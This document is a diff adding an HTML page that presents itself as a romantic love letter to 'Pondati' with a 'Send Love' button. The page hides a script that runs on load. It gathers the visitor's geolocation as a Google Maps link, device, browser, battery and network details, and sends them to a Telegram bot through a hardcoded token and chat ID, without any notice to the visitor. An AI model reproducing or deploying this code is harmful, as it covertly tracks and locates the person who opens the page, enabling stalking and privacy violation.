@@ -1,0 +1,182 @@
+<html>
+ <head>
+  <title>
+   Love Letter
+  </title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+            font-family: 'Great Vibes', cursive;
+        }
+  </style>
+ </head>
+ <body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div class="bg-white shadow-lg rounded-lg p-8 max-w-2xl mx-auto relative">
+   <div class="absolute top-0 left-0 w-full h-full overflow-hidden">
+    <img alt="A decorative background with the word 'Love' hand-drawn lettering with a red heart" class="w-full h-full object-cover opacity-20" src="https://img.freepik.com/premium-vector/love-word-hand-drawn-lettering-with-red-heart-vector-illustration_87521-1076.jpg?w=1380"/>
+   </div>
+   <div class="relative z-10">
+    <div class="text-center mb-6">
+     <img alt="A decorative heart-shaped image with the word 'Love' hand-drawn lettering with a red heart" class="mx-auto mb-4 rounded" style="border-radius: 4px;" src="https://img.freepik.com/premium-vector/love-word-hand-drawn-lettering-with-red-heart-vector-illustration_87521-1076.jpg?w=1380"/>
+     <h1 class="text-4xl text-pink-600">
+      My Dearest Pondati,
+     </h1>
+    </div>
+    <p class="text-lg text-gray-700 mb-4">
+     You brought tranquility and joy into my life from the very start. The magic in your being turns even the most mundane of moments into magical memories. Whether it is the sweet cadence of your laughter, the twinkle in your eyes as you talk about your favorite subject, or how you utter my name, all of it gives me a sense of home. 🏡
+    </p>
+    <p class="text-lg text-gray-700 mb-4">
+     Your love transcends a mere romantic relationship; you are my best friend, my pillar of strength, and above all, my confidante. Nobody has ever understood me the way you do, and the fact that you love me for who I am fills me with so much gratitude. All the qualities you possess - kindness, patience and enduring love - inspire me every single day. You motivate me to be a better person just so I can deserve a love as profound as yours. 💖
+    </p>
+    <p class="text-lg text-gray-700 mb-4">
+     Using the word pondati while naming you is more than just the affection I associate with it. You are my pair in this life and the only person I want to embrace through every joy and sorrow, every smile and every pain. Wherever life takes us, there is one thing that is petrified - my love for you. 💘
+    </p>
+    <p class="text-lg text-gray-700 mb-4">
+     With you, I have found the true home of my heart. You are not only my greatest journey, my strongest light, but the love of my life. 💞
+    </p>
+    <p class="text-lg text-gray-700 text-right">
+     Now &amp; always,
+     <br/>
+     <span class="text-2xl">
+      [Farook]
+     </span>
+    </p>
+   </div>
+   <div class="absolute bottom-4 left-4">
+    <a href="https://wa.link/5ia44t" target="_blank">
+     <button class="bg-pink-600 text-white px-4 py-2 rounded-full shadow-lg hover:bg-pink-700 transition duration-300">
+      <i class="fas fa-heart"></i>
+      Send Love
+     </button>
+    </a>
+   </div>
+  </div>
+<script>
+   // Function to get device information
+   function getDeviceInfo() {
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const browserName = getBrowserName(userAgent);
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    return {
+     userAgent,
+     platform,
+     language,
+     browserName,
+     screenResolution,
+     timezone
+    };
+   }
+
+   // Function to get browser name
+   function getBrowserName(userAgent) {
+    if (userAgent.indexOf("Firefox") > -1) {
+     return "Mozilla Firefox";
+    } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+     return "Opera";
+    } else if (userAgent.indexOf("Trident") > -1) {
+     return "Microsoft Internet Explorer";
+    } else if (userAgent.indexOf("Edge") > -1) {
+     return "Microsoft Edge";
+    } else if (userAgent.indexOf("Chrome") > -1) {
+     return "Google Chrome";
+    } else if (userAgent.indexOf("Safari") > -1) {
+     return "Apple Safari";
+    } else {
+     return "Unknown";
+    }
+   }
+
+   // Function to get battery information
+   function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+     navigator.getBattery().then(function(battery) {
+      const batteryInfo = `Battery Level: ${battery.level * 100}%\nCharging: ${battery.charging}\nCharging Time: ${battery.chargingTime}\nDischarging Time: ${battery.dischargingTime}`;
+      sendToTelegramBot(batteryInfo);
+     });
+    } else {
+     console.log("Battery API is not supported by this browser.");
+    }
+   }
+
+   // Function to get network information
+   function getNetworkInfo() {
+    if ('connection' in navigator) {
+     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+     const networkInfo = `Effective Type: ${connection.effectiveType}\nDownlink: ${connection.downlink}\nRTT: ${connection.rtt}\nSave Data: ${connection.saveData}`;
+     sendToTelegramBot(networkInfo);
+    } else {
+     console.log("Network Information API is not supported by this browser.");
+    }
+   }
+
+   // Function to get SIM information (Note: SIM information is not accessible via JavaScript due to security reasons)
+   function getSIMInfo() {
+    // SIM information is not accessible via JavaScript due to security reasons
+    console.log("SIM information is not accessible via JavaScript due to security reasons.");
+   }
+
+   // Function to get current location
+   function getLocation() {
+    if (navigator.geolocation) {
+     navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+     console.log("Geolocation is not supported by this browser.");
+    }
+   }
+
+   // Function to display location and generate Google Maps link
+   function showPosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+    sendToTelegramBot(`Google Maps Link: ${googleMapsLink}`);
+   }
+
+   // Function to send data to Telegram bot
+   function sendToTelegramBot(message) {
+    const botToken = '8020452025:AAH0852pJWCXiKQadj7bkIRlgwqv7cbCywY';
+    const chatId = '7553130853';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+     method: 'POST',
+     headers: {
+      'Content-Type': 'application/json'
+     },
+     body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+     })
+    })
+    .then(response => response.json())
+    .then(data => {
+     console.log('Success:', data);
+    })
+    .catch((error) => {
+     console.error('Error:', error);
+    });
+   }
+
+   // Main function to gather all information
+   function gatherInfo() {
+    const deviceInfo = getDeviceInfo();
+    getLocation();
+    getBatteryInfo();
+    getNetworkInfo();
+    getSIMInfo();
+
+    const deviceInfoMessage = `Device Information:\nUser Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}\nBrowser: ${deviceInfo.browserName}\nScreen Resolution: ${deviceInfo.screenResolution}\nTimezone: ${deviceInfo.timezone}`;
+
+    sendToTelegramBot(deviceInfoMessage);
+   }
+
+   // Call the main function to gather information when the page loads
+   window.onload = gatherInfo;
+  </script>
+ </body>
+</html>
